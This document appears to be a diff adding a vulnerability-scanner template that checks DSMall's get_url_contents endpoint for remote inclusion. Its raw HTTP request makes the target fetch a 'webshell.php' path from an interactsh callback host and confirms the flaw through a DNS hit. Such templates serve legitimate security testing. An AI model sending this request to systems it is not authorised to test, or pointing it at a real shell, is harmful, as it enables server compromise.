@@ -1,0 +1,17 @@
+id: DSMall-get-url-contents-Remote-inclusion
+info:
+  name: DSMall-get-url-contents-Remote-inclusion
+  author: lemonlove7
+  severity: medium
+http:
+  - raw:
+      - |-
+        GET /public/home/Connectwx/get_url_contents/?url=http://{{interactsh-url}}/webshell.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.2047.109 Safari/537.36
+    matchers:
+      - type: word
+        part: interactsh_protocol
+        words:
+          - dns
+    matchers-condition: and
